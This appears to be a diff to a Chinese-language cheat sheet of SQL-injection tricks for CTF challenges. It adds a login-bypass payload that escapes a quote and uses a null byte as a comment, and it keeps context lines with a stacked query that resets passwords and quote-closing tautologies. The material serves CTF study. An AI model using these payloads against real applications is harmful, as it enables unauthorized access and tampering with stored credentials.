@@ -76,6 +76,15 @@ username = 0;update`ctfshow_user`set`pass`=1
 2、将后面的单引号闭合即可。'or(id=26)and'1'='1   
 or '1'='1
 ```
+
+用;%00 来进行注释
+```
+http://localhost/CTF/?user=\&pwd=||1;%00
+对应SQL语句为：
+select user from users where user='\' and pwd='||1;'
+等价于：
+select user from users where user='xxxxxxxxxxx'||1#
+```
 ^
 ## **or 被过滤导致orderby、information_schema都不能用**
 用其他逻辑运算符and ， && ， &， |  ,1^1^
